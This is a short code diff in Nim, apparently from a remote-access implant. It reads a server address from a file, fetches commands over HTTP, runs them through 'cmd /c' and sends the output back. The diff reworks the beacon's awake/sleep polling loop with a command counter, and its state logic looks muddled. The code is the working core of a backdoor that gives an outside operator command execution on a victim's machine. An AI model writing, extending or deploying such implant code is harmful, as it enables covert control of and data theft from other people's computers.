@@ -8,6 +8,7 @@ var client = newHttpClient()
 const id = 1
 var sleepcheck = false
 let ip = readFile("data.txt")
+var sleepCommandCounter = 0
 
 proc runCommand(command: string):string =
   let (output, _) = execCmdEx("cmd /c $1" % [$command])
@@ -71,16 +72,27 @@ proc main() =
 proc main2() =
   while true:
     if state == "awake":
+      if sleepcheck == true:
+        state = "sleep"
+      else:
+        if getCommand() != "":
+          sendOutput(runCommand(getCommand()))
+          echo "Here"
+          sleep(30000)
+        else:
+          sleepcheck = true
+    if state == "sleep":
       for i in 0 .. 5:
-        if sleepcheck == true:
-          state = "sleep"
+        if sleepCommandCounter == 5:
+          state = "awake"
         else:
           if getCommand() != "":
             sendOutput(runCommand(getCommand()))
             echo "Here"
             sleep(30000)
+            sleepCommandCounter += 1
           else:
-            sleepcheck = true
+            sleepCommandCounter = 0
     if state == "sleep":
       echo "hi"
       
